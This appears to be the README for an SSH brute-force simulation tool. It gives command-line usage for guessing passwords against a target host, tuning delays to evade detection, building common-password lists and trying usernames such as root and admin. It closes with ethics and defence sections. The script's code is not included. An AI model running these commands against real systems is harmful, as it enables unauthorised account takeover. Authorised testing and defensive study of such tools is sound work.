# SSH Brute Force Attack Simulation

## Overview

SSH brute force attacks attempt to gain unauthorized access to systems by repeatedly trying different username and password combinations until a valid one is found. These attacks exploit weak credentials and systems that don't implement proper security measures like rate limiting or account lockouts.

This script simulates an SSH brute force attack for educational and authorized security testing purposes.

## Features

- Multiple authentication attempts with different passwords
- Password list loading from files
- Connection timeout configuration
- Rate limiting to avoid detection
- Detailed logging and statistics
- Success/failure tracking

## Requirements

- Python 3.6+
- Paramiko library (for SSH connections)

## Installation

```bash
# Install required dependencies
pip install paramiko
```

## Usage

### Basic Attack

The simplest way to run an SSH brute force attack simulation is to specify a target IP, port, username, and passwords:

```bash
# Using a comma-separated list of passwords
python ssh_brute_force.py -t 192.168.1.10 -p 22 -u admin -w password1,password2,password3
```

This will:
- Attempt to connect to 192.168.1.10 on port 22
- Try to authenticate as user "admin"
- Try each password in the list sequentially
- Use the default delay of 1 second between attempts

### Using a Password File

For more comprehensive testing, you can use a file containing a list of passwords:

```bash
# Using a password file (one password per line)
python ssh_brute_force.py -t 192.168.1.10 -p 22 -u admin -P passwords.txt
```

### Customizing the Attack

#### Adjust Delay Between Attempts

To control the rate of authentication attempts:

```bash
# Use a 2-second delay between attempts (more stealthy)
python ssh_brute_force.py -t 192.168.1.10 -p 22 -u admin -P passwords.txt -d 2

# Use a 0.5-second delay (more aggressive)
python ssh_brute_force.py -t 192.168.1.10 -p 22 -u admin -P passwords.txt -d 0.5
```

#### Set Connection Timeout

To adjust how long to wait for each connection attempt:

```bash
# Use a 10-second timeout for each connection
python ssh_brute_force.py -t 192.168.1.10 -p 22 -u admin -P passwords.txt -T 10
```

#### Limit Maximum Attempts

To limit the number of password attempts:

```bash
# Try only the first 50 passwords in the file
python ssh_brute_force.py -t 192.168.1.10 -p 22 -u admin -P passwords.txt -m 50
```

#### Enable Verbose Mode

For detailed output and debugging information:

```bash
python ssh_brute_force.py -t 192.168.1.10 -p 22 -u admin -P passwords.txt -v
```

## Advanced Usage

### Creating an Effective Password List

The effectiveness of a brute force attack depends on the quality of the password list:

```bash
# Create a simple password list
echo -e "password\nadmin\n123456\nqwerty\nletmein" > common_passwords.txt

# Use the created password list
python ssh_brute_force.py -t 192.168.1.10 -p 22 -u admin -P common_passwords.txt
```

### Testing Multiple Usernames

To test multiple usernames, run the script multiple times:

```bash
# Test with username "admin"
python ssh_brute_force.py -t 192.168.1.10 -p 22 -u admin -P passwords.txt

# Test with username "root"
python ssh_brute_force.py -t 192.168.1.10 -p 22 -u root -P passwords.txt

# Test with username "user"
python ssh_brute_force.py -t 192.168.1.10 -p 22 -u user -P passwords.txt
```

### Balancing Speed and Stealth

The delay parameter controls the balance between speed and detectability:

```bash
# Stealthy approach (longer delays)
python ssh_brute_force.py -t 192.168.1.10 -p 22 -u admin -P passwords.txt -d 3

# Balanced approach
python ssh_brute_force.py -t 192.168.1.10 -p 22 -u admin -P passwords.txt -d 1

# Aggressive approach (shorter delays)
python ssh_brute_force.py -t 192.168.1.10 -p 22 -u admin -P passwords.txt -d 0.3
```

## Ethical Considerations

This tool should ONLY be used for:
- Educational purposes
- Authorized security testing
- Password policy assessment

Unauthorized use against systems without explicit permission is illegal and unethical.

## Defensive Measures

Common defenses against SSH brute force attacks include:

1. Strong password policies
2. SSH key-based authentication
3. Rate limiting and account lockouts
4. Fail2ban or similar tools
5. Non-standard SSH ports
6. IP whitelisting
7. Two-factor authentication

Understanding these attacks helps in implementing proper defenses.

## Command Line Options

```
-t, --target         Target SSH server IP address (required)
-p, --port           Target SSH server port (default: 22)
-u, --username       Username to authenticate with (required)
-w, --passwords      Comma-separated list of passwords to try
-P, --password-file  Path to file containing passwords (one per line)
-d, --delay          Delay between connection attempts in seconds (default: 1.0)
-T, --timeout        Connection timeout in seconds (default: 5)
-m, --max-attempts   Maximum number of password attempts (default: 0, unlimited)
-v, --verbose        Enable verbose output
```

## License

Proprietary - Montimage
